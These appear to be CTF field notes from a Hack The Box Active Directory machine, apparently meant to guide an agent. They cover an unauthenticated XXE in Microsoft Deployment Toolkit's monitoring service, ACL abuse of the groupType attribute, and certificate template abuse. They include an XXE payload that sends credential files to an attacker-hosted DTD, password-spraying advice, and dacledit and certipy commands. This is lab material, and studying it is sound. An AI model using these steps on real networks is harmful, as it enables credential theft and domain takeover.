# Ad Field Notes

Distilled post-solve lessons (loophole loop). Read after SKILL.md when the challenge matches this category. Newest entries at the bottom of each section.

## General

### MDT MonitorService unauth XXE on 9800/9801 (Scaffold, HTB 2026)
**Tags:** #ctf-ad #mdt #xxe #cred-leak #initial-access
**Env:** Microsoft Deployment Toolkit on a DC/member; MonitorService web services on tcp/9800 (SOAP) and tcp/9801 (OData), no authentication
**Pattern:** MDT's monitoring endpoints deserialize attacker-supplied XML without auth. An XXE in the SOAP `EventMessage` (port 9800) does out-of-band file read via a attacker-hosted DTD + HTTP exfil, dumping `CustomSettings.ini` / `Bootstrap.ini` — which by design hold deployment service-account and domain-join credentials in plaintext.
**Key moves:**
- Find with rustscan/full-port scan — 9800/9801 are not in default nmap top-ports; grab the WSDL at `http://host:9800/MDTMonitorService/Service.svc?wsdl` and the OData feed on 9801 (`/MDTMonitorData/Events`).
- Host `exfil.dtd` + listener on attacker box (`python3 -m http.server 80` or custom capture.py), POST XML entity like `<!ENTITY x SYSTEM "file:///C:\Deployment\CustomSettings.ini">` with `<!ENTITY % p SYSTEM "http://ATTACKER/exfil.dtd">`.
- Spray leaked creds across all domain users (valid-but-disabled accounts return `STATUS_ACCOUNT_DISABLED`, which still confirms the password).
**Gotchas:** keep DTD indirection (parameter entities) — plain internal XXE echo doesn't work in SOAP responses; watch clock skew breaking Kerberos before NTLM fallback.
See: solve scripts at /home/numpav/Documents/HackTheBox/HTB-Machine/Scaffold/scripts/ (mdt_xxe.py, mdt_xxe2.py); writeup Scaffold.md §4

### groupType security-to-distribution flip via WriteProperty (Scaffold, HTB 2026)
**Tags:** #ctf-ad #acl-abuse #dacledit #group-membership
**Env:** attacker holds GenericWrite or WriteProperty(groupType/membership) on a group; impacket `dacledit`/ldapdomaindump available
**Pattern:** A DACL may block writing `member` on a *security* group, but `groupType` itself is often writable. Flipping the group to a distribution group (`-2147483646`) sidesteps security-group enforcement logic, membership writes go through, then flip back to security (`-2147483644`) so the group's rights apply again with you inside.
**Key moves:**
- Confirm the write path first: `dacledit -action read -target GROUP -principal USER`
- `dacledit -action write -target GROUP -principal USER -rights WriteMember` (or raw LDAP `groupType: -2147483646`)
- Add member, then restore `groupType: -2147483644` (security, domain-local scope bits included)
- Repeat per group in the chain (worked on both a quarantined-accounts sink group and the IT/remote-mgmt groups)
**Gotchas:** some "Remote Management" groups grant DCOM/WMI but not WinRM — if WinRM 5985 refuses, pivot to DCOM execution (`dcomexec.py`) instead of assuming blocked creds; verify each hop with an explicit auth success line.
See: writeup Scaffold.md §6; also ESC1-variant: enroll a code-signing template with attacker-chosen Subject (`CN=Package_Developers`) via `certipy req -ca CA -template PackagingCodeSigning -subject ...` to forge deploy-engine trust (§10–11).
